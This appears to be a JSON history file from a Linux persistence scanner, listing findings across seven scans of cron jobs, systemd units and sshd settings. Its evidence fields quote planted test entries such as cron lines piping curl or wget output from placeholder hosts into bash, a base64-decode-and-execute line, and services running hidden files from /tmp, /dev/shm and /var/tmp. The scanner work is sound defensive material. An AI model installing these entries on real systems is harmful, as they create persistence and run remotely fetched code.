@@ -1,0 +1,485 @@
+{
+  "updated_at": "2026-06-09T13:01:35.477396Z",
+  "scans": [
+    {
+      "generated_at": "2026-06-09T10:50:30.869394+00:00",
+      "total_findings": 3,
+      "severity_counts": {
+        "HIGH": 2,
+        "MEDIUM": 0,
+        "LOW": 1
+      },
+      "module_counts": {
+        "Cron": 1,
+        "Systemd": 1,
+        "SSH": 1
+      },
+      "new_findings": 3,
+      "removed_findings": 0,
+      "severity_changes": [],
+      "new_modules": [
+        "Cron",
+        "SSH",
+        "Systemd"
+      ],
+      "findings": [
+        {
+          "module": "Cron",
+          "path": "/etc/crontab",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "execution from /tmp/",
+          "evidence": "* * * * * /tmp/malware.sh"
+        },
+        {
+          "module": "Systemd",
+          "path": "/etc/systemd/system/backdoor.service",
+          "severity": "HIGH",
+          "rule": "ExecStart",
+          "description": "execution from /tmp/",
+          "evidence": "/bin/bash -c \"touch /tmp/pwned\""
+        },
+        {
+          "module": "SSH",
+          "path": "/etc/ssh/sshd_config",
+          "severity": "LOW",
+          "rule": "ssh_config",
+          "description": "dangerous sshd setting: X11Forwarding yes",
+          "evidence": "X11Forwarding yes"
+        }
+      ]
+    },
+    {
+      "generated_at": "2026-06-09T12:54:20.057098+00:00",
+      "total_findings": 10,
+      "severity_counts": {
+        "HIGH": 9,
+        "MEDIUM": 0,
+        "LOW": 1
+      },
+      "module_counts": {
+        "Cron": 8,
+        "Systemd": 1,
+        "SSH": 1
+      },
+      "new_findings": 7,
+      "removed_findings": 0,
+      "severity_changes": [],
+      "new_modules": [
+        "Cron"
+      ],
+      "findings": [
+        {
+          "module": "Cron",
+          "path": "/etc/crontab",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "execution from /tmp/",
+          "evidence": "* * * * * /tmp/malware.sh"
+        },
+        {
+          "module": "Cron",
+          "path": "/etc/cron.d/poc-test",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "execution from /tmp/",
+          "evidence": "* * * * * root /tmp/poc_beacon.sh"
+        },
+        {
+          "module": "Cron",
+          "path": "/etc/cron.d/poc-test",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "download and execute via curl",
+          "evidence": "*/5 * * * * nobody curl http://192.0.2.1/update.sh | bash"
+        },
+        {
+          "module": "Cron",
+          "path": "/etc/cron.d/poc-test",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "download and execute via curl",
+          "evidence": "@hourly www-data curl -s http://192.0.2.99/check | sh"
+        },
+        {
+          "module": "Cron",
+          "path": "/etc/cron.d/poc-test",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "download and execute via wget",
+          "evidence": "0 3 * * * root wget http://192.0.2.1/payload.sh | bash"
+        },
+        {
+          "module": "Cron",
+          "path": "/etc/cron.d/poc-test",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "base64 decode and execute",
+          "evidence": "*/10 * * * * root echo cG9j | base64 -d | bash"
+        },
+        {
+          "module": "Cron",
+          "path": "/etc/cron.d/poc-test",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "execution from /dev/shm/",
+          "evidence": "@reboot root /dev/shm/implant"
+        },
+        {
+          "module": "Cron",
+          "path": "/etc/cron.d/poc-test",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "execution from /var/tmp/",
+          "evidence": "0 0 * * 0 root /var/tmp/.hidden_updater"
+        },
+        {
+          "module": "Systemd",
+          "path": "/etc/systemd/system/backdoor.service",
+          "severity": "HIGH",
+          "rule": "ExecStart",
+          "description": "execution from /tmp/",
+          "evidence": "/bin/bash -c \"touch /tmp/pwned\""
+        },
+        {
+          "module": "SSH",
+          "path": "/etc/ssh/sshd_config",
+          "severity": "LOW",
+          "rule": "ssh_config",
+          "description": "dangerous sshd setting: X11Forwarding yes",
+          "evidence": "X11Forwarding yes"
+        }
+      ]
+    },
+    {
+      "generated_at": "2026-06-09T12:54:25.762209+00:00",
+      "total_findings": 6,
+      "severity_counts": {
+        "HIGH": 5,
+        "MEDIUM": 0,
+        "LOW": 1
+      },
+      "module_counts": {
+        "Cron": 1,
+        "Systemd": 4,
+        "SSH": 1
+      },
+      "new_findings": 3,
+      "removed_findings": 7,
+      "severity_changes": [],
+      "new_modules": [
+        "Systemd"
+      ],
+      "findings": [
+        {
+          "module": "Cron",
+          "path": "/etc/crontab",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "execution from /tmp/",
+          "evidence": "* * * * * /tmp/malware.sh"
+        },
+        {
+          "module": "Systemd",
+          "path": "/etc/systemd/system/backdoor.service",
+          "severity": "HIGH",
+          "rule": "ExecStart",
+          "description": "execution from /tmp/",
+          "evidence": "/bin/bash -c \"touch /tmp/pwned\""
+        },
+        {
+          "module": "Systemd",
+          "path": "/etc/systemd/system/poc-backdoor.service",
+          "severity": "HIGH",
+          "rule": "ExecStart",
+          "description": "execution from /tmp/",
+          "evidence": "/tmp/poc_agent.sh"
+        },
+        {
+          "module": "Systemd",
+          "path": "/etc/systemd/system/poc-backdoor.service",
+          "severity": "HIGH",
+          "rule": "ExecStartPre",
+          "description": "execution from /dev/shm/",
+          "evidence": "/dev/shm/.setup"
+        },
+        {
+          "module": "Systemd",
+          "path": "/etc/systemd/system/poc-backdoor.service",
+          "severity": "HIGH",
+          "rule": "ExecStartPost",
+          "description": "background execution with nohup",
+          "evidence": "nohup /var/tmp/.updater &"
+        },
+        {
+          "module": "SSH",
+          "path": "/etc/ssh/sshd_config",
+          "severity": "LOW",
+          "rule": "ssh_config",
+          "description": "dangerous sshd setting: X11Forwarding yes",
+          "evidence": "X11Forwarding yes"
+        }
+      ]
+    },
+    {
+      "generated_at": "2026-06-09T12:54:29.331699+00:00",
+      "total_findings": 3,
+      "severity_counts": {
+        "HIGH": 2,
+        "MEDIUM": 0,
+        "LOW": 1
+      },
+      "module_counts": {
+        "Cron": 1,
+        "Systemd": 1,
+        "SSH": 1
+      },
+      "new_findings": 0,
+      "removed_findings": 3,
+      "severity_changes": [],
+      "new_modules": [],
+      "findings": [
+        {
+          "module": "Cron",
+          "path": "/etc/crontab",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "execution from /tmp/",
+          "evidence": "* * * * * /tmp/malware.sh"
+        },
+        {
+          "module": "Systemd",
+          "path": "/etc/systemd/system/backdoor.service",
+          "severity": "HIGH",
+          "rule": "ExecStart",
+          "description": "execution from /tmp/",
+          "evidence": "/bin/bash -c \"touch /tmp/pwned\""
+        },
+        {
+          "module": "SSH",
+          "path": "/etc/ssh/sshd_config",
+          "severity": "LOW",
+          "rule": "ssh_config",
+          "description": "dangerous sshd setting: X11Forwarding yes",
+          "evidence": "X11Forwarding yes"
+        }
+      ]
+    },
+    {
+      "generated_at": "2026-06-09T13:01:22.526749+00:00",
+      "total_findings": 3,
+      "severity_counts": {
+        "HIGH": 2,
+        "MEDIUM": 0,
+        "LOW": 1
+      },
+      "module_counts": {
+        "Cron": 1,
+        "Systemd": 1,
+        "SSH": 1
+      },
+      "new_findings": 0,
+      "removed_findings": 0,
+      "severity_changes": [],
+      "new_modules": [],
+      "findings": [
+        {
+          "module": "Cron",
+          "path": "/etc/crontab",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "execution from /tmp/",
+          "evidence": "* * * * * /tmp/malware.sh"
+        },
+        {
+          "module": "Systemd",
+          "path": "/etc/systemd/system/backdoor.service",
+          "severity": "HIGH",
+          "rule": "ExecStart",
+          "description": "execution from /tmp/",
+          "evidence": "/bin/bash -c \"touch /tmp/pwned\""
+        },
+        {
+          "module": "SSH",
+          "path": "/etc/ssh/sshd_config",
+          "severity": "LOW",
+          "rule": "ssh_config",
+          "description": "dangerous sshd setting: X11Forwarding yes",
+          "evidence": "X11Forwarding yes"
+        }
+      ]
+    },
+    {
+      "generated_at": "2026-06-09T13:01:26.102135+00:00",
+      "total_findings": 6,
+      "severity_counts": {
+        "HIGH": 5,
+        "MEDIUM": 0,
+        "LOW": 1
+      },
+      "module_counts": {
+        "Cron": 1,
+        "Systemd": 4,
+        "SSH": 1
+      },
+      "new_findings": 3,
+      "removed_findings": 0,
+      "severity_changes": [],
+      "new_modules": [
+        "Systemd"
+      ],
+      "findings": [
+        {
+          "module": "Cron",
+          "path": "/etc/crontab",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "execution from /tmp/",
+          "evidence": "* * * * * /tmp/malware.sh"
+        },
+        {
+          "module": "Systemd",
+          "path": "/etc/systemd/system/backdoor.service",
+          "severity": "HIGH",
+          "rule": "ExecStart",
+          "description": "execution from /tmp/",
+          "evidence": "/bin/bash -c \"touch /tmp/pwned\""
+        },
+        {
+          "module": "Systemd",
+          "path": "/etc/systemd/system/poc-backdoor.service",
+          "severity": "HIGH",
+          "rule": "ExecStart",
+          "description": "execution from /tmp/",
+          "evidence": "/tmp/poc_agent.sh"
+        },
+        {
+          "module": "Systemd",
+          "path": "/etc/systemd/system/poc-backdoor.service",
+          "severity": "HIGH",
+          "rule": "ExecStartPre",
+          "description": "execution from /dev/shm/",
+          "evidence": "/dev/shm/.setup"
+        },
+        {
+          "module": "Systemd",
+          "path": "/etc/systemd/system/poc-backdoor.service",
+          "severity": "HIGH",
+          "rule": "ExecStartPost",
+          "description": "background execution with nohup",
+          "evidence": "nohup /var/tmp/.updater &"
+        },
+        {
+          "module": "SSH",
+          "path": "/etc/ssh/sshd_config",
+          "severity": "LOW",
+          "rule": "ssh_config",
+          "description": "dangerous sshd setting: X11Forwarding yes",
+          "evidence": "X11Forwarding yes"
+        }
+      ]
+    },
+    {
+      "generated_at": "2026-06-09T13:01:31.836783+00:00",
+      "total_findings": 10,
+      "severity_counts": {
+        "HIGH": 9,
+        "MEDIUM": 0,
+        "LOW": 1
+      },
+      "module_counts": {
+        "Cron": 8,
+        "Systemd": 1,
+        "SSH": 1
+      },
+      "new_findings": 7,
+      "removed_findings": 3,
+      "severity_changes": [],
+      "new_modules": [
+        "Cron"
+      ],
+      "findings": [
+        {
+          "module": "Cron",
+          "path": "/etc/crontab",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "execution from /tmp/",
+          "evidence": "* * * * * /tmp/malware.sh"
+        },
+        {
+          "module": "Cron",
+          "path": "/etc/cron.d/poc-test",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "execution from /tmp/",
+          "evidence": "* * * * * root /tmp/poc_beacon.sh"
+        },
+        {
+          "module": "Cron",
+          "path": "/etc/cron.d/poc-test",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "download and execute via curl",
+          "evidence": "*/5 * * * * nobody curl http://192.0.2.1/update.sh | bash"
+        },
+        {
+          "module": "Cron",
+          "path": "/etc/cron.d/poc-test",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "download and execute via curl",
+          "evidence": "@hourly www-data curl -s http://192.0.2.99/check | sh"
+        },
+        {
+          "module": "Cron",
+          "path": "/etc/cron.d/poc-test",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "download and execute via wget",
+          "evidence": "0 3 * * * root wget http://192.0.2.1/payload.sh | bash"
+        },
+        {
+          "module": "Cron",
+          "path": "/etc/cron.d/poc-test",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "base64 decode and execute",
+          "evidence": "*/10 * * * * root echo cG9j | base64 -d | bash"
+        },
+        {
+          "module": "Cron",
+          "path": "/etc/cron.d/poc-test",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "execution from /dev/shm/",
+          "evidence": "@reboot root /dev/shm/implant"
+        },
+        {
+          "module": "Cron",
+          "path": "/etc/cron.d/poc-test",
+          "severity": "HIGH",
+          "rule": "cron",
+          "description": "execution from /var/tmp/",
+          "evidence": "0 0 * * 0 root /var/tmp/.hidden_updater"
+        },
+        {
+          "module": "Systemd",
+          "path": "/etc/systemd/system/backdoor.service",
+          "severity": "HIGH",
+          "rule": "ExecStart",
+          "description": "execution from /tmp/",
+          "evidence": "/bin/bash -c \"touch /tmp/pwned\""
+        },
+        {
+          "module": "SSH",
+          "path": "/etc/ssh/sshd_config",
+          "severity": "LOW",
+          "rule": "ssh_config",
+          "description": "dangerous sshd setting: X11Forwarding yes",
+          "evidence": "X11Forwarding yes"
+        }
+      ]
+    }
+  ]
+}
